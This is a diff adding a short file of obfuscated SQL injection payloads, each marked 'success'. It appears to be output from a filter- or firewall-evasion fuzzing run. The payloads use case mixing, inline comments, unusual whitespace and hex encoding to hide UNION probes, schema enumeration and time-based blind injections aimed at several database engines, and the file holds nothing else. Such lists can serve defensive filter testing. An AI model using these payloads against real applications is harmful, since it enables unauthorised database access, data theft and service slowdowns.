@@ -1,0 +1,17 @@
+103 success '1" WHerE\x0c3510 \n\tliKe   (selecT/*B*/3510) '
+256 success 'SELECT * FroM information_schema.tables-- '
+275 success 'declare @s varchar\xa0 (  22  )   SeLeCT @s    LIKE   '
+384 success "(SELECT 1)  )   AS lisg WHERE '#UK' NOT LIKE '#UKy' "
+401 success "SELECT benchmark  (  5000000,md5  ( /*=X*/0x4c4d6142   )   \n)    anD    (    (    \t(  ' |'/**/liKE ' |' "
+410 success "SELECT LikE  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    ANd    (    (   'nimx'   LIKE   'nimx "
+540 success '1 uni/**/oN SElect all FroM WhEre '
+612 success 'seLECT dbms_pipe.receive_message  ( /*gpyc*/chr  (  66  )  ||chr  (  67  )   oR chr  (  79  )   Or chr  (  101  )  ,5  )   FROM dual ANd   (  "layz"   LiKe   "layz '
+655 success "SELECt lIKE  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    "
+758 success '\\x27UNION\tSELecT '
+797 success 'declare @s varchar  (  200  )   selEcT @s   =   0x77616974 ... '
+932 success '1 WherE\t1537 LiKe 1537 '
+942 success "SeLECt count  (  *  )  \xa0FROM generate_series  (/**/ 1,(SELECT/**/5000000)  )   AnD 'roca'   LIKE   'roca "
+952 success 'SEleCT count  ( /**/*  )   fROm domain.domains as t1,domain.columns AS t2,domain.tables aS t3 aNd\x0b"%"   LIKE   " '
+1000 success '1 wHeRE 8398  \xa0LIKE   0x20ce '
+1048 success 'SELecT count  (  *  )   FROM rdb$fields AS t1,rdb$types As t2,rdb$collations aS t3,rdb$functions AS t4 ANd \x0c  (    (   6977   LIKE   (sElect 6977) '
+1080 success " oR '(SELECT 1)'\n   LIKE    '(SelECT (SelECt 1)) "
